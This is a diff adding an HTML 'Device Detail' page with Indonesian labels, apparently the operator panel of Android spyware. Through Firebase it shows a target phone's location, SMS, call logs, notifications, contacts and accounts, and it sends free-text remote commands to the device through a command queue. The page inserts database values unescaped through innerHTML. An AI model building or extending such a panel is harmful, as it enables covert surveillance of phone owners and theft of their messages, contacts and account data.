@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>📱 Device Detail</title>
+    <!-- Include firebase -->
+    <style>
+        .tab { overflow: hidden; border-bottom: 1px solid #00ffaa; }
+        .tab button { background: #1e2745; color: white; float: left; border: none; outline: none; cursor: pointer; padding: 10px 20px; margin-right: 2px; }
+        .tab button:hover { background: #2e3a60; }
+        .tab button.active { background: #00ffaa; color: black; }
+        .tabcontent { display: none; padding: 20px; background: #151e3d; }
+    </style>
+</head>
+<body>
+    <div id="deviceInfo">Loading...</div>
+    <div class="tab">
+        <button class="tablinks" onclick="openTab(event, 'Location')">📍 Lokasi</button>
+        <button class="tablinks" onclick="openTab(event, 'SMS')">💬 SMS</button>
+        <button class="tablinks" onclick="openTab(event, 'Calls')">📞 Call Logs</button>
+        <button class="tablinks" onclick="openTab(event, 'Notif')">🔔 Notifikasi</button>
+        <button class="tablinks" onclick="openTab(event, 'Contacts')">👥 Kontak</button>
+        <button class="tablinks" onclick="openTab(event, 'Accounts')">🔐 Accounts</button>
+        <button class="tablinks" onclick="openTab(event, 'Commands')">⚙️ Commands</button>
+    </div>
+
+    <div id="Location" class="tabcontent">Loading lokasi...</div>
+    <div id="SMS" class="tabcontent">Loading SMS...</div>
+    <div id="Calls" class="tabcontent">Loading Call Logs...</div>
+    <div id="Notif" class="tabcontent">Loading Notifications...</div>
+    <div id="Contacts" class="tabcontent">Loading Kontak...</div>
+    <div id="Accounts" class="tabcontent">Loading Accounts...</div>
+    <div id="Commands" class="tabcontent">
+        <input type="text" id="cmdInput" placeholder="Contoh: get_sms">
+        <button onclick="sendCommand()">Kirim Perintah</button>
+        <div id="cmdResult"></div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const deviceId = urlParams.get('id');
+        
+        function loadData(path, elementId) {
+            firebase.database().ref(`${path}/${deviceId}`).on('value', snap => {
+                document.getElementById(elementId).innerHTML = '<pre>' + JSON.stringify(snap.val(), null, 2) + '</pre>';
+            });
+        }
+
+        function openTab(evt, tabName) {
+            // Sembunyikan semua tab
+            document.querySelectorAll('.tabcontent').forEach(el => el.style.display = 'none');
+            document.getElementById(tabName).style.display = 'block';
+            
+            // Load data sesuai tab
+            if(tabName === 'Location') loadData('locations', 'Location');
+            if(tabName === 'SMS') loadData('sms', 'SMS');
+            if(tabName === 'Calls') loadData('calls', 'Calls');
+            if(tabName === 'Notif') loadData('notifications', 'Notif');
+            if(tabName === 'Contacts') loadData('contacts', 'Contacts');
+            if(tabName === 'Accounts') loadData('accounts', 'Accounts');
+        }
+
+        function sendCommand() {
+            const cmd = document.getElementById('cmdInput').value;
+            firebase.database().ref(`commands/${deviceId}`).push({
+                command: cmd,
+                timestamp: Date.now(),
+                status: 'pending'
+            });
+            document.getElementById('cmdResult').innerHTML = '✅ Perintah terkirim';
+        }
+
+        // Ambil info device
+        firebase.database().ref(`devices/${deviceId}`).on('value', snap => {
+            document.getElementById('deviceInfo').innerHTML = `
+                <h3>${snap.val()?.deviceName || 'Device'} (${snap.val()?.model || '-'})</h3>
+                <p>Battery: ${snap.val()?.battery || '-'}% | OS: ${snap.val()?.os || '-'}</p>
+            `;
+        });
+    </script>
+</body>
+</html>
